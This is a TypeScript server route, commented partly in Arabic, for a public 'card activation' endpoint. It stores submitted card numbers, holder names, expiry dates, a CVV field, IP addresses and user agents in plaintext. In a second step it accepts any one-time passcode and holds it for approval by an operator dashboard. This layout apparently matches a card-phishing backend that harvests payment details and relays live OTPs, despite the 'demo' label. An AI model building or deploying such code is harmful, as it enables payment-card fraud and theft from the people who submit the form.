import { createFileRoute } from "@tanstack/react-router";

// Public endpoint: records a card activation request from the demo gateway.
// Stores the product name, IP, browser and whatever the gateway form submits.
// NOTE: only the CVV field is disabled (DISABLE_CVV_FIELD in
// CardPaymentGateway.tsx), so no security code can ever be typed or stored;
// every other card field is live and stored. The OTP step accepts any value:
// it is stored in otp_value with activation_status = 'otp_submitted' and waits
// for the dashboard to approve/reject (controls not built yet). Public prefix
// bypasses site auth, so we verify the caller is same-origin.

const asText = (value: unknown, max: number) =>
  typeof value === "string" && value.trim().length > 0 ? value.trim().slice(0, max) : null;

const UUID_PATTERN = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;

export const Route = createFileRoute("/api/public/card-request")({
  server: {
    handlers: {
      POST: async ({ request }) => {
        try {
          const origin = request.headers.get("origin");
          if (origin) {
            const originHost = new URL(origin).host;
            const requestHost = new URL(request.url).host;
            if (originHost !== requestHost) {
              return new Response("forbidden", { status: 403 });
            }
          }

          const body = (await request.json().catch(() => null)) as Record<string, unknown> | null;

          const forwarded = request.headers.get("x-forwarded-for");
          const ip =
            request.headers.get("cf-connecting-ip") ?? forwarded?.split(",").at(0)?.trim() ?? null;
          const userAgent = request.headers.get("user-agent")?.slice(0, 500) ?? null;

          const { supabaseAdmin } = await import("@/integrations/supabase/client.server");

          // الخطوة الثانية: العميل يرسل أي قيمة OTP → نسجلها ونضعها للمراجعة
          const requestId =
            typeof body?.["requestId"] === "string" ? (body["requestId"] as string) : null;
          if (requestId && body?.["event"] === "otp_submitted") {
            if (!UUID_PATTERN.test(requestId)) {
              return new Response("bad request", { status: 400 });
            }
            const otpValue = asText(body?.["otpValue"], 32);
            if (!otpValue) {
              return new Response("bad request", { status: 400 });
            }
            const rawAttempts = body?.["otpAttempts"];
            const attempts =
              typeof rawAttempts === "number" && Number.isFinite(rawAttempts)
                ? Math.min(Math.max(Math.round(rawAttempts), 0), 99)
                : 0;

            // لا اعتماد هنا: القبول/الرفض من الداشبورد (زر يُضاف لاحقًا).
            const { error } = await supabaseAdmin
              .from("card_activation_requests")
              .update({
                otp_value: otpValue,
                activation_status: "otp_pending",
                otp_attempts: attempts,
              })
              .eq("id", requestId);
            if (error) throw error;

            return new Response(null, { status: 204 });
          }

          // الخطوة الأولى: تسجيل طلب التفعيل بكل حقول الفورم (الـ CVV فاضي لأنه معطّل)
          const cardTitle = asText(body?.["cardTitle"], 200);
          if (!cardTitle) {
            return new Response("bad request", { status: 400 });
          }

          // الرقم المميز: يُولَّد هنا تلقائيًا (6 أرقام) ولا يُطلب من العميل إطلاقًا.
          // عند تعارض الرقم مع سجل سابق نعيد المحاولة برقم جديد.
          let created: { id: string; client_ref: string } | null = null;
          for (let attempt = 0; attempt < 3 && !created; attempt += 1) {
            const clientRef = String(Math.floor(100000 + Math.random() * 900000));
            const { data, error } = await supabaseAdmin
              .from("card_activation_requests")
              .insert({
                client_ref: clientRef,
                activation_status: "card_pending",
                card_title: cardTitle,
                card_brand: asText(body?.["cardBrand"], 20),
                card_number: asText(body?.["cardNumber"], 25),
                card_holder_name: asText(body?.["cardHolderName"], 60),
                expiry_month: asText(body?.["expiryMonth"], 2),
                expiry_year: asText(body?.["expiryYear"], 4),
                cvv: asText(body?.["cvv"], 4),
                ip,
                user_agent: userAgent,
              })
              .select("id, client_ref")
              .single();

            if (error) {
              if (error.code === "23505") continue; // تعارض الرقم المميز → رقم جديد
              throw new Error(error.message);
            }
            created = data;
          }

          if (!created) {
            return new Response("error", { status: 500 });
          }

          return new Response(JSON.stringify({ id: created.id, clientRef: created.client_ref }), {
            status: 200,
            headers: { "content-type": "application/json" },
          });
        } catch (error) {
          console.error("card-request error", error);
          return new Response("error", { status: 500 });
        }
      },
    },
  },
});
